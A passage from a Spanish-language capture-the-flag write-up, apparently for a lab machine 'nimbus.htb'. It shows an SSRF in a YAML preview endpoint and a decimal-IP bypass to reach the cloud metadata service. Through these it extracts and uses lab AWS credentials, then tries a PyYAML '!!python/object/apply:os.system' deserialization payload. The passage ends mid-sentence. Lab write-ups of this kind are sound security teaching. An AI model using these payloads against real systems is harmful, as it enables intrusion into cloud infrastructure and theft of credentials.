+<p>Para probar un posible SSRF, vamos a modificar el parámetro yaml_body en Caido, intentando introducir un campo que apunte a nuestro servidor atacante. He modificado la petición para que haga una solicitud HTTP hacia mi ip gracias a un script hecho por mi (enlace: https://github.com/D4vKry/HTTP-GET-POST-listener):</p>
+<p>Ejemplo en la página:
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nt">schedule</span><span class="p">:</span><span class="w"> </span><span class="s">"0</span><span class="nv"> </span><span class="s">2</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nt">runtime</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python3.11</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://&lt;tu_ip&gt;/</span>
+</code></pre></div><p></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>POST<span class="w"> </span>/jobs/preview<span class="w"> </span>HTTP/1.1
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Host:<span class="w"> </span>nimbus.htb
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>X11<span class="p">;</span><span class="w"> </span>Linux<span class="w"> </span>x86_64<span class="p">;</span><span class="w"> </span>rv:152.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/152.0
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Accept-Language:<span class="w"> </span>es-ES,es<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.7
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>Content-Length:<span class="w"> </span><span class="m">11</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Origin:<span class="w"> </span>http://nimbus.htb
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Connection:<span class="w"> </span>keep-alive
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>Referer:<span class="w"> </span>http://nimbus.htb/jobs
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Priority:<span class="w"> </span><span class="nv">u</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span>i
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="nv">yaml_body</span><span class="o">=</span><span class="nv">yaml_body</span><span class="o">=</span>name%3A+test%0D%0Aschedule%3A+%220+2+*+*+*%22%0D%0Aruntime%3A+python3.11%0D%0Aurl%3A+http%3A%2F%2F10.10.14.x%2F
+</code></pre></div>
+<p>Lamentablemente, después de comprobarlo nos damos cuenta que simplemente lo interpreta como texto plano, y no nos ha hecho una petición a nuestra web, confirmándonos que el campo interno del yaml NO se ejecuta en la web. </p>
+<h3 id="descubrimiento-de-ssrf">Descubrimiento de SSRF<a class="headerlink" href="#descubrimiento-de-ssrf" title="Permanent link">¶</a></h3>
+<p>Al ver el parámetro yaml_body actuando como un linter de texto, plantea como los desarrolladores interactúan con la herramienta. Muchas aplicaciones que procesan plantillas o configs, permiten cargar archivos directamente desde repositorios de servidores remotos.</p>
+<p>He decidido comprobar si el endpoint de /jobs/preview acepta otros parámetros comúnes directamente en el POST, cambiando yaml_body por la url:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nf">POST</span> <span class="nn">/jobs/preview</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">nimbus.htb</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">30</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="nt">url</span><span class="o">=</span><span class="s">http%3A%2F%2F&lt;tu_ip&gt;%2F</span>
+</code></pre></div>
+<p>La página nos devuelve un error:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260624204122.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260624204122.png"></a></p>
+<p>Nos confirma 2 cosas:
+- El parámetro URL existe
+- Tiene validación para que termine en .yaml o .yml</p>
+<p>Simplemente modificamos la petición para añadir un fichero .yaml al final como este:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nv">url</span><span class="o">=</span>http%3A%2F%2F&lt;tu_ip&gt;%2Ftest.yaml
+</code></pre></div>
+<p>Volvemos a enviarlo y observamos el script:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">HTTP</span><span class="o">-</span><span class="n">GET</span><span class="o">-</span><span class="n">POST</span><span class="o">-</span><span class="n">listener</span> <span class="n">git</span><span class="p">:(</span><span class="n">main</span><span class="p">)</span> <span class="n">sudo</span> <span class="n">python3</span> <span class="n">web</span><span class="o">.</span><span class="n">py</span> <span class="mi">80</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">contraseña</span> <span class="n">para</span> <span class="n">deivid</span><span class="p">:</span> 
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">Serving</span> <span class="n">on</span> <span class="n">port</span> <span class="mf">80.</span><span class="o">..</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">GET</span> <span class="n">Request</span> <span class="n">received</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="mf">10.129.245.218</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Jun</span><span class="o">/</span><span class="mi">2026</span> <span class="mi">18</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="s2">"GET /test.yaml HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</code></pre></div>
+<h3 id="extraccion-de-credenciales-aws">Extracción de Credenciales AWS<a class="headerlink" href="#extraccion-de-credenciales-aws" title="Permanent link">¶</a></h3>
+<p>Sabiendo que estamos en un entorno de AWS simulado (por los mensajes después de los envíos de los yaml). nuestro objetivo natural sería apuntar al IMDS (Instance Metadata Service) en la ip predeterminada 169.254.169.254</p>
+<p>Podemos probar a hacer una petición directamente como hicimos anteriormente pero nos devuelve un acceso denegado:
+<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260624204841.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260624204841.png"></a></p>
+<p>Para evadir esta restricción, aplicamos una técnica de codificación que el SO resolverá fácilmente pero que el filtro de la web pasará por alto.</p>
+<h3 id="evasion-por-codificacion-decimal">Evasión por Codificación Decimal<a class="headerlink" href="#evasion-por-codificacion-decimal" title="Permanent link">¶</a></h3>
+<p>Haciendo la conversión de la ip a Decimal obtenemos:
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="x">2852039166</span>
+</code></pre></div>
+<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260624205203.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260624205203.png"></a><p></p>
+<p>Para interactuar con el IMDS de forma válida, debemos estructurar la URL combinando el bypass de la IP y el bypass de la extension .yaml</p>
+<p>Como no conocemos la estructura interna, primero listaré la raíz del servicio de seguridad de AWS para ver qué nos devuelve, lanzando la petición al endpoint base de las credenciales IAM (/latest/meta-data/iam/security-credentials/):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="err">   &lt;h1&gt;Preview&lt;/h1&gt;</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="err">    &lt;div class="tag"&gt;&lt;a href="/jobs"&gt;← submit another&lt;/a&gt;&lt;/div&gt;</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="err">    &lt;div class="panel"&gt;</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="err">        &lt;div class="meta"&gt;Fetched: &lt;code&gt;http://2852039166/latest/meta-data/iam/security-credentials/?file=.yaml&lt;/code&gt; · HTTP 200&lt;/div&gt;</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="err">        &lt;h3&gt;Raw response&lt;/h3&gt;</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="err">        &lt;pre&gt;nimbus-web-role&lt;/pre&gt;</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="err">        &lt;h3&gt;Parsed&lt;/h3&gt;</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="err">        &lt;pre&gt;nimbus-web-role&lt;/pre&gt;</span>
+</code></pre></div>
+<p>Vemos como nos da el nombre del rol que es "numbus-web-role".</p>
+<p>Sabiendo el nombre del rol, concatenamos este elementa en la ruta para extraer credenciales temporales:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="err">&lt;body&gt;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="err">    &lt;h1&gt;Preview&lt;/h1&gt;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="err">    &lt;div class="tag"&gt;&lt;a href="/jobs"&gt;← submit another&lt;/a&gt;&lt;/div&gt;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="err">    &lt;div class="panel"&gt;</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="err">        &lt;div class="meta"&gt;Fetched: &lt;code&gt;http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?file=.yaml&lt;/code&gt; · HTTP 200&lt;/div&gt;</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="err">        &lt;h3&gt;Raw response&lt;/h3&gt;</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="err">        &lt;pre&gt;{</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="err">  &amp;#34;Code&amp;#34;: &amp;#34;Success&amp;#34;,</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="err">  &amp;#34;LastUpdated&amp;#34;: &amp;#34;2026-06-25T17:35:23Z&amp;#34;,</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="err">  &amp;#34;Type&amp;#34;: &amp;#34;AWS-HMAC&amp;#34;,</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="err">  &amp;#34;AccessKeyId&amp;#34;: &amp;#34;ASIAQX4PG7L2K9M3N5R8&amp;#34;,</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="err">  &amp;#34;SecretAccessKey&amp;#34;: &amp;#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&amp;#34;,</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="err">  &amp;#34;Token&amp;#34;: &amp;#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&amp;#34;,</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="err">  &amp;#34;Expiration&amp;#34;: &amp;#34;2026-06-25T23:35:23Z&amp;#34;</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="err">}&lt;/pre&gt;</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="err">        &lt;h3&gt;Parsed&lt;/h3&gt;</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="err">        &lt;pre&gt;{&amp;#39;Code&amp;#39;: &amp;#39;Success&amp;#39;, &amp;#39;LastUpdated&amp;#39;: &amp;#39;2026-06-25T17:35:23Z&amp;#39;, &amp;#39;Type&amp;#39;: &amp;#39;AWS-HMAC&amp;#39;, &amp;#39;AccessKeyId&amp;#39;: &amp;#39;ASIAQX4PG7L2K9M3N5R8&amp;#39;, &amp;#39;SecretAccessKey&amp;#39;: &amp;#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&amp;#39;, &amp;#39;Token&amp;#39;: &amp;#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&amp;#39;, &amp;#39;Expiration&amp;#39;: &amp;#39;2026-06-25T23:35:23Z&amp;#39;}&lt;/pre&gt;</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="err">    &lt;/div&gt;</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="err">&lt;/body&gt;</span>
+</code></pre></div>
+<p>Validamos que las credenciales tienen efecto, pero antes necesitamos buscar como interactuar con AWS.</p>
+<p>Como ya hemos enumerado directorios solo queda enumerar dominios que es lo más probable:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nimbus<span class="w"> </span>gobuster<span class="w"> </span>vhost<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>-u<span class="w"> </span>http://nimbus.htb/<span class="w"> </span>--append-domain<span class="w">                  </span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">===============================================================</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Gobuster<span class="w"> </span>v3.8.2
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="o">===============================================================</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                       </span>http://nimbus.htb/
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                    </span>GET
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                   </span><span class="m">10</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                  </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">                </span>gobuster/3.8.2
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                   </span>10s
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Append<span class="w"> </span>Domain:<span class="w">             </span><span class="nb">true</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Exclude<span class="w"> </span>Hostname<span class="w"> </span>Length:<span class="w">   </span><span class="nb">false</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="o">===============================================================</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>VHOST<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="o">===============================================================</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>aws.nimbus.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">305</span><span class="o">]</span>
+</code></pre></div>
+<p>Efectivamente existe el subdominio de aws. Vamos a exportar todas las llaves y comprobar que funcione:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">"ASIAQX4PG7L2K9M3N5R8"</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">"bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">"IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_DEFAULT_REGION</span><span class="o">=</span><span class="s2">"us-east-1"</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--endpoint-url<span class="w"> </span>http://aws.nimbus.htb<span class="w"> </span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="o">{</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">    </span><span class="s2">"UserId"</span>:<span class="w"> </span><span class="s2">"AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a"</span>,
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">    </span><span class="s2">"Account"</span>:<span class="w"> </span><span class="s2">"847219365028"</span>,
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">    </span><span class="s2">"Arn"</span>:<span class="w"> </span><span class="s2">"arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="o">}</span>
+</code></pre></div>
+<h3 id="acceso-limitado-a-aws-y-cambio-de-estrategia">Acceso Limitado a AWS y Cambio de Estrategia<a class="headerlink" href="#acceso-limitado-a-aws-y-cambio-de-estrategia" title="Permanent link">¶</a></h3>
+<p>Una vez validada la sesión bajo el rol nimbus-web-role, procedemos a enumerar los proyectos disponibles en el servicio AWS CodeBuild para buscar posibles vectores de ejecución de comandos o configuraciones expuestas:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>aws<span class="w"> </span>codebuild<span class="w"> </span>list-projects<span class="w"> </span>--endpoint-url<span class="w"> </span>http://aws.nimbus.htb
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>An error occurred (403) when calling the ListProjects operation: <span class="p">&lt;</span><span class="nt">ErrorResponse</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"https://sts.amazonaws.com/doc/2011-06-15/"</span><span class="p">&gt;</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  <span class="p">&lt;</span><span class="nt">Error</span><span class="p">&gt;</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    <span class="p">&lt;</span><span class="nt">Type</span><span class="p">&gt;</span>Sender<span class="p">&lt;/</span><span class="nt">Type</span><span class="p">&gt;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    <span class="p">&lt;</span><span class="nt">Code</span><span class="p">&gt;</span>AccessDenied<span class="p">&lt;/</span><span class="nt">Code</span><span class="p">&gt;</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    <span class="p">&lt;</span><span class="nt">Message</span><span class="p">&gt;</span>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: codebuild:ListProjects on resource: *<span class="p">&lt;/</span><span class="nt">Message</span><span class="p">&gt;</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>  <span class="p">&lt;/</span><span class="nt">Error</span><span class="p">&gt;</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>  <span class="p">&lt;</span><span class="nt">RequestId</span><span class="p">&gt;</span>x5660007-amv4-16e6-21r0-8b01j71af982<span class="p">&lt;/</span><span class="nt">RequestId</span><span class="p">&gt;</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="p">&lt;/</span><span class="nt">ErrorResponse</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>El error "AccessDenied" nos confirma que estamos operando con una identidad cloud con privilegios severamente restringidos. Ante esta limitación para interactuar con CodeBuild, decidimos cambiar de estrategia y ampliar el radio de enumeración sobre otros servicios comunes de la API de AWS para comprobar dónde tenemos realmente permisos de lectura o escritura.</p>
+<h3 id="analisis-de-deserializacion-insegura-en-el-procesador-yaml">Análisis de Deserialización Insegura en el Procesador YAML<a class="headerlink" href="#analisis-de-deserializacion-insegura-en-el-procesador-yaml" title="Permanent link">¶</a></h3>
+<p>En paralelo, recordamos que la funcionalidad principal de la aplicación web (/jobs/preview) recibe y procesa estructuras en formato YAML. En aplicaciones desarrolladas bajo entornos Python, es habitual el uso de la librería PyYAML. Si el backend emplea de manera insegura el método clásico yaml.load() junto con yaml.Loader, el parser intentará instanciar cualquier objeto arbitrario de Python que se defina en el documento, convirtiéndose en un vector potencial de RCE.</p>
+<p>Para comprobar si el servidor web parsea objetos de forma insegura en caliente, interceptamos la petición con Caido e inyectamos el constructor nativo "!!python/object/apply" invocando una traza ICMP hacia nuestra IP:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test-rce</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nt">schedule</span><span class="p">:</span><span class="w"> </span><span class="s">"0</span><span class="nv"> </span><span class="s">2</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nt">runtime</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python3.11</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="kt">!!python/object/apply:os.system</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">"ping</span><span class="nv"> </span><span class="s">-c</span><span class="nv"> </span><span class="s">3</span><span class="nv"> </span><span class="s">10.10.14.x"</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+<p>Preparamos un capturador de tráfico en nuestra máquina atacante:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>icmp
+</code></pre></div>
+<p>Sin embargo, al enviar la solicitud, la aplicación web responde de inmediato con el siguiente mensaje:</p>
